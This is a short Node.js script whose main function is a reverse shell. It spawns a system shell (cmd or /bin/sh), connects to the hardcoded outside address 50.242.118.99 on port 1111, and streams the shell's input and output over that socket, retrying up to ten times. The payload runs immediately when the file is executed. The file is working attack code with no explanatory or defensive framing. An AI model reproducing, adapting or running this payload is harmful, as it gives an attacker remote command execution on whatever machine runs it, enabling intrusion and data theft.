function node_payload() {
    // Check if 'require' is available globally, otherwise use 'global.process.mainModule.constructor._load'
    var require = global.require || global.process.mainModule.constructor._load;
    if (!require) return;

    // Determine the command based on the platform (Windows or Unix-like)
    var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";

    // Importing required modules
    var net = require("net");
    var cp = require("child_process");
    var util = require("util");
    var sh = cp.spawn(cmd, []);

    // Defining variables
    var client = this;
    var counter = 0;

    // Function to establish connection and handle data streaming
    function StagerRepeat() {
        client.socket = net.connect(1111, "50.242.118.99", function () {
            // Stream data from the socket to the spawned shell process stdin
            client.socket.pipe(sh.stdin);

            // Stream data from the spawned shell process stdout/stderr to the socket
            if (typeof util.pump === "undefined") {
                sh.stdout.pipe(client.socket);
                sh.stderr.pipe(client.socket);
            } else {
                util.pump(sh.stdout, client.socket);
                util.pump(sh.stderr, client.socket);
            }
        });

        // Handling socket errors
        client.socket.on("error", function (error) {
            counter++;
            // Retry connection up to 10 times with a delay of 5 seconds each
            if (counter <= 10) {
                setTimeout(function () {
                    StagerRepeat();
                }, 5 * 1000);
            } else {
                // If connection fails after 10 attempts, exit the process
                process.exit();
            }
        });
    }

    // Initiating the connection
    StagerRepeat();
}

// Logging a message
console.log("poop");

// Invoking the node_payload function
node_payload();

